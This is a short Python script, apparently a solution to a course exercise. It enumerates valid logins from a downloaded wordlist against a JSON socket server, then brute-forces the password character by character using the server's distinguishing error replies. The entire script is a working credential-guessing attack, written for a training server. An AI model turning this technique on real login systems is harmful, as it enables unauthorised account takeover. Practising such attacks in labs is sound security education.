# before running the program, download the file used from here:
#       https://stepik.org/media/attachments/lesson/255258/logins.txt
# then save it as logins.txt and upload it to the same directory of execution
import socket
import sys
import json
import string

def lg_pwd(lg, pwd):
    return json.dumps({'login': lg, 'password': pwd})

def find_login(lg_list):
    for lg in lg_list:
        s.send(lg_pwd(lg, '').encode())
        r = json.loads(s.recv(1024).decode())['result']

        if r != 'Wrong login!':
            return lg

def find_password(lg):
    chars, pwd = string.ascii_letters + string.digits, ''
    while 1:
        for c in chars:
            s.send(lg_pwd(lg, pwd+c).encode())
            r = json.loads(s.recv(1024).decode())['result']

            if r == 'Exception happened during login':
                pwd += c

            if r == 'Connection success!':
                return pwd+c

with socket.socket() as s, open("logins.txt") as lg_file:
    hostname, port = sys.argv[1:]
    s.connect((hostname, int(port)))

    lg_list = lg_file.read().split('\n')

    lg = find_login(lg_list)
    pwd = find_password(lg)

    print(lg_pwd(lg, pwd))
